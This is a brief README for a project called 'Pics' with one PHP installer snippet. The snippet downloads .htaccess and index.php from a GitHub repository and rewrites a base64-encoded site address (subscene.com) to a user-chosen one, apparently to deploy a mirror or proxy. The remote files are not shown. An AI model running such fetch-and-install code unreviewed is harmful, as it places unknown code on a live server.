# Pics

```
<?php
$youraddres = '';
copy('https://raw.githubusercontent.com/mm4130/Pics/master/.htaccess', '.htaccess');
$file = file_get_contents('https://raw.githubusercontent.com/mm4130/Pics/master/index.php');
$file = str_replace('aHR0cHM6Ly9zdWJzY2VuZS5jb20=',base64_encode($youraddres),$file);
file_put_contents('index.php',$file);
```
